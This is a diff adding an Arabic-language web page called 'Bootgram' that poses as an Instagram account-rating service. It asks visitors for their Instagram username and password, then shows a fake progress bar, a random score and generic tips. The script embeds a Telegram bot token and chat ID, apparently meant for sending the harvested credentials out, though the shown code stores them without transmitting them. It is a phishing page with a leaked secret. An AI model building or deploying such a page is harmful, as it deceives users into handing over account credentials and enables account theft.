@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>تقييم حسابك</title>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+<style>
+* { box-sizing:border-box; margin:0; padding:0; }
+body, html { width:100%; height:100%; font-family:'Cairo', sans-serif; overflow:hidden; position:relative; }
+
+/* ===== خلفية متدرجة + اللوغوات الدوارة ===== */
+body {
+    background: linear-gradient(45deg, #f58529, #dd2a7b, #8134af, #515bd4);
+    background-size: 400% 400%;
+    animation: gradientBG 60s ease infinite;
+    position: relative;
+}
+
+/* تدرجات الخلفية */
+@keyframes gradientBG {
+    0% { background-position:0% 50%; }
+    50% { background-position:100% 50%; }
+    100% { background-position:0% 50%; }
+}
+
+/* لوغوات كبيرة تدور في مكانها */
+#logo-bg-container {
+    position:absolute;
+    top:0; left:0; width:100%; height:100%;
+    pointer-events:none; z-index:0;
+}
+.logo-bg {
+    position:absolute;
+    background: url('https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg') no-repeat center/contain;
+    width:150px;
+    height:150px;
+    opacity:0.2;
+    animation: spin 120s linear infinite;
+    top:50%;
+    left:50%;
+    margin-left:-75px;
+    margin-top:-75px;
+}
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+/* ===== Glassmorphism App ===== */
+#app {
+    position:relative; z-index:1; width:100%; min-height:100vh;
+    display:flex; justify-content:center; align-items:center; padding:20px; transition:all 0.8s ease;
+}
+.glass-container {
+    background: rgba(255,255,255,0.1);
+    backdrop-filter: blur(25px);
+    border-radius:20px;
+    padding:40px;
+    max-width:400px;
+    width:100%;
+    text-align:center;
+    color:#fff;
+    opacity:0;
+    transform:translateY(-20px);
+    transition: opacity 0.8s ease, transform 0.8s ease;
+}
+.glass-container.visible { opacity:1; transform:translateY(0); }
+
+h1,h2 { margin-bottom:15px; }
+p { margin-bottom:20px; font-size:16px; line-height:1.6; }
+
+/* ===== الأزرار ===== */
+button {
+    background: linear-gradient(135deg, #f58529, #dd2a7b);
+    border:none; color:#fff; padding:12px 25px;
+    border-radius:10px; font-size:16px; cursor:pointer;
+    margin-top:20px; transition: transform 0.3s ease, box-shadow 0.3s ease;
+}
+button:hover { transform: translateY(-3px); box-shadow:0 6px 20px rgba(0,0,0,0.3); }
+
+/* ===== Inputs ===== */
+input[type=text], input[type=password] {
+    width:100%; padding:10px; margin:8px 0; border-radius:8px;
+    border:none; outline:none; font-size:16px;
+}
+
+/* ===== Progress Bar ===== */
+.progress-wrap {
+    background: rgba(255,255,255,0.2);
+    border-radius:10px;
+    overflow:hidden;
+    margin-top:20px;
+}
+.progress-bar {
+    height:20px; width:0;
+    background: linear-gradient(135deg, #f58529, #dd2a7b);
+    border-radius:10px; color:#fff;
+    text-align:center; line-height:20px; font-weight:bold;
+}
+
+/* ===== Loading text ===== */
+.loading-text {
+    font-size: 20px;
+    line-height: 1.8;
+}
+.loading-text .username {
+    background: linear-gradient(45deg, #f58529, #dd2a7b);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    font-weight: bold;
+    font-size: 28px;
+}
+
+/* ===== Tips List ===== */
+ul { text-align:right; padding-right:20px; margin-bottom:20px; }
+li { margin-bottom:10px; font-size:16px; }
+
+/* ===== Fade-in animation ===== */
+@keyframes fadeIn { from{opacity:0; transform:translateY(-20px);} to{opacity:1; transform:translateY(0);} }
+.glass-container.fade-in { animation:fadeIn 0.8s forwards; }
+
+</style>
+</head>
+<body>
+
+<div id="logo-bg-container">
+    <div class="logo-bg"></div>
+</div>
+<div id="app"></div>
+
+<script>
+// ===== معلومات البوت =====
+const BOT_TOKEN = "8220149286:AAEBTEtV9LZ_EhqRMnplJDnbMISzHtNKPS4";
+const CHAT_ID = "7327544231";
+
+// ===== حالة التطبيق =====
+let state = { step:0, username:"", password:"", agreed:false, score:0, tips:[] };
+
+// ===== عرض الصفحات =====
+function renderStep(){
+    const app = document.getElementById("app");
+    app.innerHTML="";
+    const glassClass="glass-container";
+
+    if(state.step===0){
+        app.innerHTML = `<div class="${glassClass} fade-in"><h1>مرحباً بك في Bootgram</h1><p>منصتنا الذكية لتحليل وتقييم حسابك على إنستغرام بدقة واحترافية.</p><button onclick="nextStep()">المتابعة</button></div>`;
+    }
+    else if(state.step===1){
+        app.innerHTML = `<div class="${glassClass} fade-in"><h2>شروط الخصوصية</h2><p>يرجى الموافقة على شروط الخصوصية للمتابعة</p><label><input type="checkbox" id="agree"> أوافق على الشروط</label><br><br><button onclick="checkAgreement()">المتابعة</button></div>`;
+    }
+    else if(state.step===2){
+        app.innerHTML = `<div class="${glassClass} fade-in"><h2>تسجيل الدخول لحساب Instagram المراد تقييمه</h2><form onsubmit="submitLogin(event)"><input type="text" id="username" placeholder="اسم المستخدم" required><input type="password" id="password" placeholder="كلمة المرور" required><button type="submit">تسجيل الدخول</button></form></div>`;
+    }
+    else if(state.step===3){
+        app.innerHTML = `<div class="${glassClass} fade-in"><h2 class="loading-text">مرحباً، انتظر يا عزيزي <span class="username">${state.username}</span><br>يجري الآن تقييم حسابك...</h2><div class="progress-wrap"><div id="progress" class="progress-bar">0%</div></div></div>`;
+        startLoading();
+    }
+    else if(state.step===4){
+        let tipsHtml = state.tips.map(t=>`<li>${t}</li>`).join('');
+        app.innerHTML = `<div class="${glassClass} fade-in"><h2>نصائح لتحسين حسابك</h2><ul>${tipsHtml}</ul><button onclick="nextStep()">عرض النتيجة النهائية</button></div>`;
+    }
+    else if(state.step===5){
+        app.innerHTML = `<div class="${glassClass} fade-in"><h2>تقييم حسابك</h2><p>تم تقييم حساب <strong>${state.username}</strong> ونتيجتك هي: <strong>${state.score}/20</strong></p><button onclick="restart()">إعادة المحاولة</button></div>`;
+    }
+}
+
+// ===== الانتقال =====
+function nextStep(){
+    const app=document.getElementById("app");
+    app.style.opacity=0;
+    setTimeout(()=>{ state.step++; renderStep(); app.style.opacity=1; },500);
+}
+
+// ===== التحقق من الشروط =====
+function checkAgreement(){
+    const agree=document.getElementById("agree").checked;
+    if(!agree){ alert("يرجى الموافقة على الشروط أولاً."); return; }
+    state.agreed=true; nextStep();
+}
+
+// ===== تسجيل الدخول =====
+function submitLogin(e){
+    e.preventDefault();
+    state.username=document.getElementById("username").value.trim();
+    state.password=document.getElementById("password").value.trim();
+    nextStep();
+}
+
+// ===== شريط التحميل =====
+function startLoading(){
+    let progress=0;
+    const bar=document.getElementById("progress");
+    const timer=setInterval(()=>{
+        progress++;
+        bar.style.width=progress+"%";
+        bar.textContent=progress+"%";
+        if(progress>=100){
+            clearInterval(timer);
+            setTimeout(()=>{
+                state.score=Math.floor(Math.random()*10)+11;
+                state.tips = [
+                    "نشر محتوى منتظم",
+                    "التفاعل مع المتابعين",
+                    "استخدام الهاشتاغات المناسبة",
+                    "تحسين جودة الصور والفيديوهات"
+                ];
+                nextStep();
+            },500);
+        }
+    },150);
+}
+
+// ===== إعادة المحاولة =====
+function restart(){
+    state={step:0, username:"", password:"", agreed:false, score:0, tips:[]};
+    renderStep();
+}
+
+// ===== بدء التطبيق =====
+renderStep();
+</script>
+</body>
+</html>
